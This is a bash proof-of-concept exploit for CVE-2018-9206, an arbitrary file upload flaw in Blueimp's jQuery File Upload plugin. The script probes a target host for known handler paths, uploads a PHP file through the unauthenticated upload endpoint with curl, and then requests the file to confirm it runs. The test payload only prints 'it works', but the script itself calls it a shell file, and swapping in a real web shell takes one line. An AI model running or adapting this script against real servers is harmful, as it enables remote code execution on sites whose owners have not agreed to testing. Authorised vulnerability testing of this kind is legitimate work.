#!/bin/bash 

USERAGENT="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
PATHS=("server/php/upload.class.php" "example/upload.php" "server/php/UploadHandler.php" "php/index.php")
MALICIOUS_FILE="aplskdkeoirk54566664.php"

# Checking curl & jq

curl -h &>/dev/null
if [ $? -ne 0 ]; then
    echo "[!] Please install curl."
    echo "# apt install curl"
    exit 1
fi

jq -h &>/dev/null
if [ $? -ne 0 ]; then
    echo "[!] Please install jq."
    echo "# apt install jq"
    exit 1
fi

# Checking url

if [ -z $1 ]; then
    echo "[!] Please supply a target host as an argument."
    echo "$0 http://www.example.com"
    exit 1
fi

# Generating payload

echo "<?php echo \"it works\" ?>" > ${MALICIOUS_FILE}
echo  "________________________________________________________________________________"
echo  "|PoC Exploit for Blueimp's jQuery File Uploader CVE-2018-9206"
echo  "|Checks for older versions of the code and upload a shell file."
echo  "---/"
echo
echo  "[+] Checking variations :"

exploit_path=""

# Looking for upload php class file

for x in ${PATHS[@]}; do
    echo "[*] Testing... -> $1/$x"
    curl -ski -A "${USERAGENT}" "$1/$x" | head -1 | grep 200 &>/dev/null

    if [ $? -eq 0 ]; then
        echo "[+] Found Path: $x"
        exploit_path="$x"

        break;
    fi;

done

if [ "X""${exploit_path}" == "X" ]; then
    echo "[!] ### Error: A vulnerable jQuery-File-Upload plugin was not found!"
    exit 1
fi

# Uploading payload

res=""
exploit_path="$(dirname ${exploit_path})/index.php"

echo "[+] Running curl -sk -A \"${USERAGENT}\" -F \"files[]=@${MALICIOUS_FILE}\" -F \"filename=${MALICIOUS_FILE}\" \"$1/${exploit_path}\""

filename=`curl -sk -A "${USERAGENT}" -F "files[]=@${MALICIOUS_FILE}" -F "filename=${MALICIOUS_FILE}" "$1/${exploit_path}" | jq -r .files[].name`
filename=`echo "$filename" | sed 's/ /%20/g'`

# Trying to see if victim has been exploited

echo "[+] Testing path: $1/$(dirname ${exploit_path})/files/${filename}"
res=`curl -sk -A "${USERAGENT}" "$1/$(dirname ${exploit_path})/files/${filename}"`

if [ "${res}" == "it works" ]; then
    echo "[!] $1 is vulnerable"
fi